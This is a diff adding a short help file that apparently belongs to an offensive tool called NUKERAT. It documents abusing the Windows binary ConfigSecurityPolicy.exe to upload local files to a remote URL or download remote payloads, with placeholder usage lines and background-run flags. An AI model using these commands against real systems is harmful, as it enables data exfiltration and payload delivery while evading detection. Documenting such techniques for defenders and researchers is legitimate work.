@@ -1,0 +1,19 @@
+ABOUT
+    Windows Defender co-management policy tool.
+    Uploads a local file to a URL or downloads remote payloads into
+    INetCache.
+
+USAGE:
+    ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
+    ConfigSecurityPolicy.exe {REMOTEURL}
+
+EXAMPLES:
+    ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
+    ConfigSecurityPolicy.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
